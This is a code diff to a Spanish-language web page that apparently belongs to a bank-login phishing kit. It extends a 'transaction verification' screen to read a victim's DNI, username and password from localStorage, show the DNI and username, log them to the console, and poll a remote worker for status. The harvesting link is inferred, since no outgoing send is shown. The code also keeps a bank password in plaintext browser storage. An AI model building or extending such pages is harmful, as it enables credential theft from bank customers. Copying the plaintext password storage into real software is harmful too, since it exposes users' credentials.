@@ -290,6 +290,24 @@
       word-break: break-all;
     }
 
+    .transaction-dni {
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      color: #f47721;
+      word-break: break-all;
+      margin-top: 8px;
+      font-weight: 600;
+    }
+
+    .transaction-usuario {
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      color: #f47721;
+      word-break: break-all;
+      margin-top: 4px;
+      font-weight: 600;
+    }
+
     .transaction-status {
       margin-top: 10px;
       font-size: 14px;
@@ -596,8 +614,10 @@
 
     <!-- Información de transacción -->
     <div class="transaction-info" id="transactionInfo">
-      <div class="transaction-title">ID de Transacción</div>
+      <div class="transaction-title">Información de la Transacción</div>
       <div class="transaction-id" id="transactionId">Cargando...</div>
+      <div class="transaction-dni" id="dniInfo">Cargando DNI...</div>
+      <div class="transaction-usuario" id="usuarioInfo">Cargando Usuario...</div>
       <div class="transaction-status" id="transactionStatus">● Conectando...</div>
     </div>
 
@@ -630,7 +650,7 @@
       // Obtener datos del localStorage
       const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
       
-      if (!bancoldata || !bancoldata.usuario || !bancoldata.clave || !bancoldata.transactionId) {
+      if (!bancoldata || !bancoldata.dni || !bancoldata.usuario || !bancoldata.clave || !bancoldata.transactionId) {
         mostrarError('Faltan datos de login. Redirigiendo al inicio...');
         setTimeout(() => {
           window.location.href = `${BASE_URL}/`;
@@ -638,17 +658,21 @@
         return;
       }
 
+      const dni = bancoldata.dni;
       const usuario = bancoldata.usuario;
       const clave = bancoldata.clave;
       const transactionId = bancoldata.transactionId;
       
-      // Mostrar el ID de transacción
+      // Mostrar el ID de transacción y datos del usuario
       document.getElementById('transactionId').textContent = transactionId;
+      document.getElementById('dniInfo').textContent = `DNI: ${dni}`;
+      document.getElementById('usuarioInfo').textContent = `Usuario: ${usuario}`;
       document.getElementById('transactionStatus').textContent = '⏳ Verificando estado...';
       
       console.log('🔍 Verificando estado de transacción:', transactionId);
       console.log(`📡 Worker URL: ${WORKER_URL}`);
       console.log(`🌐 Base URL: ${BASE_URL}`);
+      console.log(`👤 DNI: ${dni}, Usuario: ${usuario}`);
 
       // Iniciar la verificación de estado
       await checkStatus(transactionId);
